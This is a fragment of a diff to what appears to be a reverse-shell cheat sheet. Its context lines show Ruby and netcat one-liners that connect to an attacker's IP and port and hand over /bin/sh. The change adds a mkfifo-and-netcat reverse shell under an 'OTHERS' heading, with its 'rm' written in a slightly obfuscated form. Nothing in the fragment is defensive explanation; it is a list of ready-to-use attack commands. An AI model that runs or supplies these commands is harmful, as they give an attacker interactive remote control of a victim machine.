@@ -47,4 +47,6 @@ ruby -rsocket -e'f=TCPSocket.open("IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d 
 # Netcat
 nc -e /bin/sh IP PORT
 
+#OTHERS
+r"m" /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP port >/tmp/f
 
